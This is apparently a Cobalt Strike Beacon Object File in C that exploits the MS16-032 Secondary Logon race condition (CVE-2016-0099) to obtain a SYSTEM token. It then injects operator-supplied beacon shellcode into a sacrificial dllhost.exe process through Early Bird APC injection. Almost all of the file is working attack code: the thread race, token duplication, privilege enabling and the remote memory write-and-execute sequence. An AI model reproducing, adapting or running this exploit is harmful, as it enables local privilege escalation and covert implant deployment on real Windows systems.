#include <windows.h>
#include "beacon.h"

/* ------------------------------------------------------------------ */
/*  MS16-032 Local Privilege Escalation BOF                            */
/*  CVE-2016-0099 - Race condition in Secondary Logon Service          */
/*                                                                     */
/*  The seclogon service (running as SYSTEM) processes                  */
/*  CreateProcessWithLogonW requests. When multiple threads race this   */
/*  call, the service can confuse which client it is servicing and      */
/*  assign its own SYSTEM token as the primary token of the child       */
/*  process. We detect this by checking each spawned child's token.     */
/* ------------------------------------------------------------------ */

#ifndef SECURITY_MANDATORY_SYSTEM_RID
#define SECURITY_MANDATORY_SYSTEM_RID 0x00004000
#endif

#define NUM_RACE_THREADS       10
#define MAX_RACE_ITERATIONS    500
#define MAX_EXPLOIT_ATTEMPTS   15

/* ------------------------------------------------------------------ */
/*  Shared race state                                                  */
/*                                                                     */
/*  fFound/fStop use GCC __sync builtins for atomic access.            */
/*  InterlockedExchange/InterlockedCompareExchange are compiler        */
/*  intrinsics, NOT kernel32.dll exports - the BOF loader cannot       */
/*  resolve them. __sync builtins compile to inline lock cmpxchg       */
/*  instructions with no DLL dependency.                               */
/* ------------------------------------------------------------------ */

typedef struct {
    volatile LONG   fFound;         /* 1 = SYSTEM token found          */
    volatile LONG   fStop;          /* 1 = all threads should exit     */
    HANDLE          hSystemToken;   /* duplicated SYSTEM token         */
    volatile LONG   nCreated;       /* child processes created (diag)  */
    volatile LONG   nFailed;        /* CreateProcessWithLogonW fails   */
} RACE_STATE;

/* ------------------------------------------------------------------ */
/*  Token validation                                                   */
/*  Checks: primary type, SYSTEM SID (S-1-5-18).                       */
/* ------------------------------------------------------------------ */

static BOOL IsSystemToken(HANDLE hToken) {
    DWORD      retLen;
    BYTE       userBuf[256];
    TOKEN_TYPE tt;
    LPWSTR     sidStr = NULL;
    BOOL       isSys;

    /* Must be a primary token */
    if (!ADVAPI32$GetTokenInformation(
            hToken, TokenType, &tt, sizeof(tt), &retLen))
        return FALSE;
    if (tt != TokenPrimary)
        return FALSE;

    /* Token user must be SYSTEM (S-1-5-18) */
    if (!ADVAPI32$GetTokenInformation(
            hToken, TokenUser, userBuf, sizeof(userBuf), &retLen))
        return FALSE;

    if (!ADVAPI32$ConvertSidToStringSidW(
            ((TOKEN_USER*)userBuf)->User.Sid, &sidStr))
        return FALSE;

    isSys = 0;
    if (sidStr[0] == L'S' && sidStr[1] == L'-' &&
        sidStr[2] == L'1' && sidStr[3] == L'-' &&
        sidStr[4] == L'5' && sidStr[5] == L'-' &&
        sidStr[6] == L'1' && sidStr[7] == L'8' &&
        sidStr[8] == L'\0') {
        isSys = 1;
    }

    KERNEL32$LocalFree(sidStr);
    return isSys;
}

/* ------------------------------------------------------------------ */
/*  Race thread                                                        */
/*                                                                     */
/*  Each thread repeatedly calls CreateProcessWithLogonW with          */
/*  CREATE_SUSPENDED, opens the child's token, and checks if the race  */
/*  caused seclogon to assign its SYSTEM token to the child.           */
/*                                                                     */
/*  CRITICAL: lpCommandLine MUST be a writable buffer (stack array).   */
/*  CreateProcessWithLogonW documents it as [in,out] and may modify    */
/*  the string. Passing a string literal (read-only .rdata) causes an  */
/*  access violation that silently makes every call return FALSE.       */
/* ------------------------------------------------------------------ */

static DWORD WINAPI RaceThread(LPVOID lpParam) {
    RACE_STATE*          pState = (RACE_STATE*)lpParam;
    STARTUPINFOW         si;
    PROCESS_INFORMATION  pi;
    HANDLE               hChildToken;
    HANDLE               hDupToken;
    int                  iter;

    /* Writable command line buffer - MUST be on the stack, not a literal */
    wchar_t cmdLine[] = L"C:\\Windows\\System32\\cmd.exe";

    MSVCRT$memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    for (iter = 0; iter < MAX_RACE_ITERATIONS; iter++) {

        /* Check if another thread already won or main thread says stop */
        if (pState->fFound || pState->fStop)
            break;

        MSVCRT$memset(&pi, 0, sizeof(pi));

        /* The race target: CreateProcessWithLogonW
         * LOGON_NETCREDENTIALS_ONLY means seclogon does not validate
         * the credentials but still hits the token assignment code path
         * that contains the race condition.
         * CREATE_SUSPENDED keeps the child alive for token inspection. */
        if (!ADVAPI32$CreateProcessWithLogonW(
                L"foo", L"bar", L"baz",
                LOGON_NETCREDENTIALS_ONLY,
                NULL,
                cmdLine,
                CREATE_SUSPENDED | CREATE_NO_WINDOW,
                NULL, NULL, &si, &pi)) {
            __sync_fetch_and_add(&pState->nFailed, 1);
            continue;
        }

        __sync_fetch_and_add(&pState->nCreated, 1);

        /* Open the child process's primary token */
        hChildToken = NULL;
        if (ADVAPI32$OpenProcessToken(
                pi.hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hChildToken)) {

            /* Did the child get SYSTEM's token from the race? */
            if (IsSystemToken(hChildToken)) {

                /* Duplicate the token with full access for later use */
                hDupToken = NULL;
                if (KERNEL32$DuplicateHandle(
                        KERNEL32$GetCurrentProcess(), hChildToken,
                        KERNEL32$GetCurrentProcess(), &hDupToken,
                        TOKEN_ALL_ACCESS, FALSE, 0)) {

                    /* Atomic CAS: first thread to flip 0->1 wins */
                    if (__sync_bool_compare_and_swap(&pState->fFound, 0, 1)) {
                        pState->hSystemToken = hDupToken;
                    } else {
                        /* Another thread already won */
                        KERNEL32$CloseHandle(hDupToken);
                    }
                }
            }
            KERNEL32$CloseHandle(hChildToken);
        }

        /* Kill the child - we got its token or it is not useful */
        KERNEL32$TerminateProcess(pi.hProcess, 0);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$CloseHandle(pi.hThread);
    }

    return 0;
}

/* ------------------------------------------------------------------ */
/*  Privilege helper                                                   */
/* ------------------------------------------------------------------ */

static BOOL EnablePrivilege(HANDLE hToken, LPCWSTR privName) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!ADVAPI32$LookupPrivilegeValueW(NULL, privName, &luid))
        return FALSE;

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    return ADVAPI32$AdjustTokenPrivileges(
        hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
}

/* ------------------------------------------------------------------ */
/*  Beacon injection - Early Bird APC into sacrificial SYSTEM process   */
/*  RW->RX memory protection, QueueUserAPC (no CreateRemoteThread).    */
/* ------------------------------------------------------------------ */

static BOOL InjectBeacon(HANDLE hSystemToken, unsigned char* sc, int scLen) {
    STARTUPINFOW        si;
    PROCESS_INFORMATION pi;
    LPVOID   pRemote;
    SIZE_T   written;
    DWORD    oldProt;
    BOOL     created = FALSE;
    BOOL     impersonating = FALSE;
    wchar_t  target[] = L"C:\\Windows\\System32\\dllhost.exe";

    MSVCRT$memset(&si, 0, sizeof(si));
    MSVCRT$memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    /* Method 1: CreateProcessWithTokenW */
    created = ADVAPI32$CreateProcessWithTokenW(
        hSystemToken, 0, NULL, target,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi);

    if (!created) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] CreateProcessWithTokenW failed (%d), trying impersonation",
            KERNEL32$GetLastError());

        /* Method 2: Impersonate SYSTEM, then CreateProcessAsUserW */
        if (ADVAPI32$ImpersonateLoggedOnUser(hSystemToken)) {
            impersonating = TRUE;
            created = ADVAPI32$CreateProcessAsUserW(
                hSystemToken, NULL, target, NULL, NULL, FALSE,
                CREATE_SUSPENDED | CREATE_NO_WINDOW,
                NULL, NULL, &si, &pi);
        }
    }

    if (impersonating)
        ADVAPI32$RevertToSelf();

    if (!created) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Cannot spawn SYSTEM process: %d",
            KERNEL32$GetLastError());
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Spawned sacrificial SYSTEM process PID: %d", pi.dwProcessId);

    /* Allocate RW memory in target */
    pRemote = KERNEL32$VirtualAllocEx(
        pi.hProcess, NULL, scLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pRemote) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] VirtualAllocEx failed: %d", KERNEL32$GetLastError());
        goto fail;
    }

    /* Write shellcode */
    if (!KERNEL32$WriteProcessMemory(
            pi.hProcess, pRemote, sc, scLen, &written)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] WriteProcessMemory failed: %d", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
        goto fail;
    }

    /* Flip RW -> RX */
    if (!KERNEL32$VirtualProtectEx(
            pi.hProcess, pRemote, scLen,
            PAGE_EXECUTE_READ, &oldProt)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] VirtualProtectEx failed: %d", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
        goto fail;
    }

    /* Queue APC on suspended main thread - fires before entry point */
    if (!KERNEL32$QueueUserAPC((PAPCFUNC)pRemote, pi.hThread, 0)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] QueueUserAPC failed: %d", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(pi.hProcess, pRemote, 0, MEM_RELEASE);
        goto fail;
    }

    /* Resume thread - APC fires and executes our shellcode */
    KERNEL32$ResumeThread(pi.hThread);

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Beacon injected via Early Bird APC");
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    return TRUE;

fail:
    KERNEL32$TerminateProcess(pi.hProcess, 0);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    return FALSE;
}

/* ------------------------------------------------------------------ */
/*  BOF entry point                                                    */
/* ------------------------------------------------------------------ */

void go(char* args, int len) {
    datap               parser;
    int                  scLen = 0;
    unsigned char*       sc;
    SYSTEM_INFO          sysInfo;
    HANDLE               hProcToken = NULL;
    HANDLE               hThreads[NUM_RACE_THREADS];
    RACE_STATE           state;
    int                  attempt, i, numThreads;

    /* ---- Parse shellcode from Aggressor ---- */
    BeaconDataParse(&parser, args, len);
    sc = (unsigned char*)BeaconDataExtract(&parser, &scLen);

    if (!sc || scLen == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] No shellcode provided. Usage: ms16032_inject <listener>");
        return;
    }

    /* ---- Pre-flight: CPU count ---- */
    KERNEL32$GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] MS16-032 requires 2+ logical CPUs, found %d",
            sysInfo.dwNumberOfProcessors);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] MS16-032 Local Privilege Escalation");
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] CPUs: %d | Shellcode: %d bytes | Threads: %d",
        sysInfo.dwNumberOfProcessors, scLen, NUM_RACE_THREADS);

    /* ---- Enable privileges ---- */
    if (ADVAPI32$OpenProcessToken(
            KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &hProcToken)) {
        EnablePrivilege(hProcToken, L"SeImpersonatePrivilege");
        EnablePrivilege(hProcToken, L"SeAssignPrimaryTokenPrivilege");
        KERNEL32$CloseHandle(hProcToken);
    }

    /* ---- Initialize race state ---- */
    MSVCRT$memset(&state, 0, sizeof(state));

    /* ---- Exploitation loop ---- */
    for (attempt = 0; attempt < MAX_EXPLOIT_ATTEMPTS; attempt++) {

        if (state.hSystemToken) break;

        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Attempt %d/%d - racing seclogon...",
            attempt + 1, MAX_EXPLOIT_ATTEMPTS);

        /* Reset state for this attempt */
        state.fFound   = 0;
        state.fStop    = 0;
        state.nCreated = 0;
        state.nFailed  = 0;

        /* Launch race threads */
        numThreads = 0;
        for (i = 0; i < NUM_RACE_THREADS; i++) {
            HANDLE h = KERNEL32$CreateThread(
                NULL, 0, RaceThread, &state, 0, NULL);
            if (h) hThreads[numThreads++] = h;
        }

        if (numThreads == 0) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Failed to create race threads");
            break;
        }

        /* Wait for threads to finish their iterations */
        KERNEL32$WaitForMultipleObjects(
            numThreads, hThreads, TRUE, 120000);

        /* Signal stragglers to stop */
        state.fStop = 1;
        KERNEL32$WaitForMultipleObjects(
            numThreads, hThreads, TRUE, 5000);

        for (i = 0; i < numThreads; i++)
            KERNEL32$CloseHandle(hThreads[i]);

        /* Diagnostics */
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Processes created: %d | Failed: %d",
            (int)state.nCreated, (int)state.nFailed);

        if (state.nCreated == 0 && state.nFailed > 0) {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] CreateProcessWithLogonW always fails - is seclogon service running?");
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Check: sc query seclogon | sc start seclogon");
            break;
        }

        if (state.hSystemToken) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[+] SYSTEM token acquired!");
            break;
        }
    }

    if (!state.hSystemToken) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Failed to obtain SYSTEM token after %d attempts",
            attempt);
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Target may be patched - check for KB3139914");
        return;
    }

    /* ---- Inject beacon as SYSTEM ---- */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Injecting beacon as SYSTEM...");

    if (InjectBeacon(state.hSystemToken, sc, scLen))
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Exploit complete!");
    else
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Injection failed");

    KERNEL32$CloseHandle(state.hSystemToken);
}
